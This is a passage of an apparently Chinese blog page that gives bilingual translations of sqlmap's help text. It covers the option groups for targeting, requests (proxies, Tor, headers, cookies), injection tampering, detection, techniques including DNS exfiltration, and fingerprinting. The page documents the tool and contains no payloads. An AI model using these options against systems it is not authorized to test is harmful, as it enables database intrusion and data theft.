<span class="number">1</span>)</span><br><span class="line"><span class="comment">## 详细级别：0-6（默认为1）</span></span><br></pre></td></tr></table></figure><h2 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Target（目标）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">At least one of these options has to be provided to define the target(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-d DIRECT Connection string for direct database connection</span><br><span class="line"><span class="comment">## 指定具体数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-u URL, <span class="comment">--url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")</span></span><br><span class="line"><span class="comment">## 目标URL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file</span><br><span class="line"><span class="comment">## 解析目标(s)从Burp或WebScarab代理日志文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file</span><br><span class="line"><span class="comment">## 解析目标(s)从远程站点地图文件(.xml)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-m BULKFILE Scan multiple targets given in a textual file</span><br><span class="line"><span class="comment">## 扫描文本文件中给出的多个目标</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-r REQUESTFILE <span class="keyword">Load</span> <span class="keyword">HTTP</span> request <span class="keyword">from</span> a <span class="keyword">file</span></span><br><span class="line"><span class="comment">## 从本地文件加载HTTP请求 ，多用于post注入。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK Process Google dork results <span class="keyword">as</span> target URLs</span><br><span class="line"><span class="comment">## 处理Google的结果作为目标URL。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-c CONFIGFILE <span class="keyword">Load</span> options <span class="keyword">from</span> a configuration INI <span class="keyword">file</span></span><br><span class="line"><span class="comment">## 从INI配置文件中加载选项。</span></span><br></pre></td></tr></table></figure><h2 id="Request（请求）"><a href="#Request（请求）" class="headerlink" title="Request（请求）"></a>Request（请求）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">Request（请求）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to specify how to connect to the target URL</span><br><span class="line"><span class="comment">## 这些选项可以用来指定如何连接到目标URL。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--method=METHOD Force usage of given HTTP method (e.g. PUT)</span></span><br><span class="line"><span class="comment">## 强制使用给定的HTTP方法（e.g. PUT）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--data=DATA Data string to be sent through POST</span></span><br><span class="line"><span class="comment">## 通过POST发送的数据字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--param-del=PARA.. Character used for splitting parameter values</span></span><br><span class="line"><span class="comment">## 用于拆分参数值的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--cookie=COOKIE HTTP Cookie header value HTTP</span></span><br><span class="line"><span class="comment">## Cookie头的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--cookie-del=COO.. Character used for splitting cookie values</span></span><br><span class="line"><span class="comment">## 用于分割Cookie值的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--load-cookies=L.. File containing cookies in Netscape/wget format</span></span><br><span class="line"><span class="comment">## 包含Netscape / wget格式的cookie的文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--drop-set-cookie Ignore Set-Cookie header from response</span></span><br><span class="line"><span class="comment">## 从响应中忽略Set-Cookie头</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--user-agent=AGENT HTTP User-Agent header value</span></span><br><span class="line"><span class="comment">## 指定 HTTP User - Agent头</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--random-agent Use randomly selected HTTP User-Agent header value</span></span><br><span class="line"><span class="comment">##  使用随机选定的HTTP User - Agent头</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--host=HOST HTTP Host header value</span></span><br><span class="line"><span class="comment">## HTTP主机头值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--referer=REFERER HTTP Referer header value</span></span><br><span class="line"><span class="comment">##  指定 HTTP Referer头</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-H HEADER, <span class="comment">--hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1")</span></span><br><span class="line"><span class="comment">## 额外header</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--headers=HEADERS Extra headers (e.g. "Accept-Language: fr\\nETag: 123")</span></span><br><span class="line"><span class="comment">## 额外header</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP</span></span><br><span class="line"><span class="comment">## 认证类型(Basic, Digest, NTLM or PKI)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--auth-cred=AUTH.. HTTP authentication credentials (name:password)</span></span><br><span class="line"><span class="comment">##  HTTP认证凭证(name:password)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--auth-file=AUTH.. HTTP authentication PEM cert/private key file</span></span><br><span class="line"><span class="comment">## HTTP认证 PEM认证/私钥文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--ignore-401 Ignore HTTP Error 401 (Unauthorized)</span></span><br><span class="line"><span class="comment">## 忽略HTTP错误401</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--proxy=PROXY Use a proxy to connect to the target URL</span></span><br><span class="line"><span class="comment">## 使用代理连接到目标网址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--proxy-cred=PRO.. Proxy authentication credentials (name:password)</span></span><br><span class="line"><span class="comment">## 代理认证证书(name:password)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--proxy-file=PRO.. Load proxy list from a file</span></span><br><span class="line"><span class="comment">## 从文件中加载代理列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--ignore-proxy Ignore system default proxy settings</span></span><br><span class="line"><span class="comment">## 忽略系统默认代理设置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tor Use Tor anonymity network</span></span><br><span class="line"><span class="comment">## 使用Tor匿名网络</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tor-port=TORPORT Set Tor proxy port other than default</span></span><br><span class="line"><span class="comment">##  设置Tor代理端口而不是默认值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)</span></span><br><span class="line"><span class="comment">## 设置Tor代理类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--check-tor Check to see if Tor is used properly</span></span><br><span class="line"><span class="comment">## 检查Tor是否正确使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--delay=DELAY Delay in seconds between each HTTP request</span></span><br><span class="line"><span class="comment">## 每个HTTP请求之间的延迟（秒）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)</span></span><br><span class="line"><span class="comment">## 秒超时连接前等待（默认30）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--retries=RETRIES Retries when the connection timeouts (default 3)</span></span><br><span class="line"><span class="comment">##  连接超时时重试（默认值3）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--randomize=RPARAM Randomly change value for given parameter(s)</span></span><br><span class="line"><span class="comment">## 随机更改给定参数的值(s)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--safe-url=SAFEURL URL address to visit frequently during testing</span></span><br><span class="line"><span class="comment">## 在测试期间频繁访问的URL地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--safe-post=SAFE.. POST data to send to a safe URL</span></span><br><span class="line"><span class="comment">## POST数据发送到安全URL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--safe-req=SAFER.. Load safe HTTP request from a file</span></span><br><span class="line"><span class="comment">## 从文件加载安全HTTP请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--safe-freq=SAFE.. Test requests between two visits to a given safe URL</span></span><br><span class="line"><span class="comment">## 在两次访问给定安全网址之间测试请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--skip-urlencode Skip URL encoding of payload data</span></span><br><span class="line"><span class="comment">## 跳过有效载荷数据的URL编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--csrf-token=CSR.. Parameter used to hold anti-CSRF token</span></span><br><span class="line"><span class="comment">## 参数用于保存anti-CSRF令牌</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token</span></span><br><span class="line"><span class="comment">## 提取anti-CSRF URL地址访问令牌</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--force-ssl Force usage of SSL/HTTPS</span></span><br><span class="line"><span class="comment">## 强制使用SSL /HTTPS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--hpp Use HTTP parameter pollution method</span></span><br><span class="line"><span class="comment">## 使用HTTP参数pollution的方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码"import hashlib;id2=hashlib.md5(id).hexdigest()")</span></span><br></pre></td></tr></table></figure><h2 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a>Optimization（优化）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Optimization（优化）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to <span class="keyword">optimize</span> the <span class="keyword">performance</span> <span class="keyword">of</span> sqlmap</span><br><span class="line"><span class="comment">## 这些选项可用于优化sqlmap的性能</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-o Turn <span class="keyword">on</span> <span class="keyword">all</span> optimization switches</span><br><span class="line"><span class="comment">## 开启所有优化开关</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--predict-output Predict common queries output</span></span><br><span class="line"><span class="comment">## 预测常见的查询输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--keep-alive Use persistent HTTP(s) connections</span></span><br><span class="line"><span class="comment">## 使用持久的HTTP（S）连接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--null-connection Retrieve page length without actual HTTP response body</span></span><br><span class="line"><span class="comment">## 从没有实际的HTTP响应体中检索页面长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)</span></span><br><span class="line"><span class="comment">## 最大的HTTP（S）请求并发量（默认为1）</span></span><br></pre></td></tr></table></figure><h2 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Injection（注入）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts</span><br><span class="line"><span class="comment">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER Testable parameter(s)</span><br><span class="line"><span class="comment">## 可测试的参数（S）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--skip=SKIP Skip testing for given parameter(s)</span></span><br><span class="line"><span class="comment">## 跳过对给定参数的测试</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--skip-static Skip testing parameters that not appear to be dynamic</span></span><br><span class="line"><span class="comment">## 跳过测试不显示为动态的参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses")</span></span><br><span class="line"><span class="comment">## 使用正则表达式排除参数进行测试（e.g. "ses"）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dbms=DBMS Force back-end DBMS to this value</span></span><br><span class="line"><span class="comment">## 强制后端的DBMS为此值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dbms-cred=DBMS.. DBMS authentication credentials (user:password)</span></span><br><span class="line"><span class="comment">## DBMS认证凭证(user:password)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os=OS Force back-end DBMS operating system to this value</span></span><br><span class="line"><span class="comment">## 强制后端的DBMS操作系统为这个值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--invalid-bignum Use big numbers for invalidating values</span></span><br><span class="line"><span class="comment">## 使用大数字使值无效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--invalid-logical Use logical operations for invalidating values</span></span><br><span class="line"><span class="comment">## 使用逻辑操作使值无效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--invalid-string Use random strings for invalidating values</span></span><br><span class="line"><span class="comment">## 使用随机字符串使值无效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--no-cast Turn off payload casting mechanism</span></span><br><span class="line"><span class="comment">## 关闭有效载荷铸造机制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--no-escape Turn off string escaping mechanism</span></span><br><span class="line"><span class="comment">## 关闭字符串转义机制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--prefix=PREFIX Injection payload prefix string</span></span><br><span class="line"><span class="comment">## 注入payload字符串前缀</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--suffix=SUFFIX Injection payload suffix string</span></span><br><span class="line"><span class="comment">## 注入payload字符串后缀</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tamper=TAMPER Use given script(s) for tampering injection data</span></span><br><span class="line"><span class="comment">## 使用给定的脚本（S）篡改注入数据</span></span><br></pre></td></tr></table></figure><h2 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Detection（检测）:</span><br><span class="line">These options can be used to customize the detection phase</span><br><span class="line"><span class="comment">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--level=LEVEL Level of tests to perform (1-5, default 1)</span></span><br><span class="line"><span class="comment">## 执行测试的等级（1-5，默认为1）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--risk=RISK Risk of tests to perform (1-3, default 1)</span></span><br><span class="line"><span class="comment">## 执行测试的风险（0-3，默认为1）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--string=STRING String to match when query is evaluated to True</span></span><br><span class="line"><span class="comment">##  查询时有效时在页面匹配字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--not-string=NOT.. String to match when query is evaluated to False</span></span><br><span class="line"><span class="comment">## 当查询求值为无效时匹配的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--regexp=REGEXP Regexp to match when query is evaluated to True</span></span><br><span class="line"><span class="comment">## 查询时有效时在页面匹配正则表达式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--code=CODE HTTP code to match when query is evaluated to True</span></span><br><span class="line"><span class="comment">## 当查询求值为True时匹配的HTTP代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--text-only Compare pages based only on the textual content</span></span><br><span class="line"><span class="comment">## 仅基于在文本内容比较网页</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--titles Compare pages based only on their titles</span></span><br><span class="line"><span class="comment">##  仅根据他们的标题进行比较</span></span><br></pre></td></tr></table></figure><h2 id="Techniques（技巧）"><a href="#Techniques（技巧）" class="headerlink" title="Techniques（技巧）"></a>Techniques（技巧）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Techniques（技巧）:</span><br><span class="line">These options can be used to tweak testing of specific SQL injection techniques</span><br><span class="line"><span class="comment">## 这些选项可用于调整具体的SQL注入测试。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique=TECH SQL injection techniques to use (default "BEUSTQ")</span></span><br><span class="line"><span class="comment">## SQL 注入技术测试（默认BEUST）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)</span></span><br><span class="line"><span class="comment">##  DBMS响应的延迟时间（默认为5秒）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--union-cols=UCOLS Range of columns to test for UNION query SQL injection</span></span><br><span class="line"><span class="comment">##  定列范围用于测试UNION查询注入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--union-char=UCHAR Character to use for bruteforcing number of columns</span></span><br><span class="line"><span class="comment">##  用于暴力猜解列数的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--union-from=UFROM Table to use in FROM part of UNION query SQL injection</span></span><br><span class="line"><span class="comment">##  要在UNION查询SQL注入的FROM部分使用的表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dns-domain=DNS.. Domain name used for DNS exfiltration attack</span></span><br><span class="line"><span class="comment">##  域名用于DNS漏出攻击</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--second-order=S.. Resulting page URL searched for second-order response</span></span><br><span class="line"><span class="comment">## 生成页面的URL搜索为second-order响应</span></span><br></pre></td></tr></table></figure><h2 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fingerprint（指纹）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-f, <span class="comment">--fingerprint Perform an extensive DBMS version fingerprint</span></span><br><span class="line"><span class="comment">## 执行检查广泛的DBMS版本指纹</span></span><br></pre></td></tr></table></figure><h2 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 